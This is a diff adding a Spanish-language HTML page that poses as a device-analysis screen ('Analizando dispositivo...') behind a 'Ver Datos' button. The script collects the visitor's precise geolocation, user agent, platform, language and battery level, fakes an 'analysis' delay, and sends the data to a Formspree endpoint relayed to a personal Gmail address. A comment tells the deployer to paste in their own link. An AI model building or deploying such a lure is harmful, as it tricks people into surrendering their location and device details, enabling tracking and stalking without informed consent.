@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #0f0f0f; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 20px; border-radius: 12px; text-align: center; width: 300px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+        h2 { margin-top: 0; font-size: 18px; }
+        p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
+        .btn { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
+        .loader { border: 3px solid #333; border-top: 3px solid #007bff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 10px; font-size: 13px; color: #4cd137; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>📡 Analizando dispositivo...</h2>
+    <p>Toca el botón para ver los detalles.</p>
+    <button class="btn" onclick="enviar()">Ver Datos</button>
+    <div class="loader" id="spinner"></div>
+    <div id="status">✅ Enviado al servidor</div>
+</div>
+
+<script>
+    // ⚠️ IMPORTANTE: Reemplaza la línea de abajo con TU LINK DE FORMSPREE ⚠️
+    const API_URL = "https://formspree.io/f/xgakrnjg"; 
+
+    async function enviar() {
+        document.querySelector('.btn').style.display = 'none';
+        document.getElementById('spinner').style.display = 'block';
+
+        let info = {};
+
+        try {
+            // 1. Ubicación
+            if (navigator.geolocation) {
+                await new Promise(resolve => navigator.geolocation.getCurrentPosition(p => {
+                    info.lat = p.coords.latitude;
+                    info.lon = p.coords.longitude;
+                    resolve();
+                }, () => { info.error = true; resolve(); }));
+            }
+
+            // 2. Dispositivo
+            info.ua = navigator.userAgent;
+            info.plat = navigator.platform;
+            info.lang = navigator.language;
+            
+            // 3. Batería
+            let battery = 0;
+            try { 
+                let b = await navigator.getBattery(); 
+                battery = Math.round(b.level * 100); 
+            } catch(e){}
+            info.battery = battery + "%";
+
+            // Simular espera de "análisis"
+            await new Promise(r => setTimeout(r, 2000));
+
+            // Enviar a Formspree
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(info)
+            });
+
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('status').innerText = "✅ Datos enviados a jp39919622@gmail.com";
+
+        } catch (error) {
+            document.getElementById('status').innerText = "Error al enviar.";
+        }
+    }
+</script>
+
+</body>
+</html>
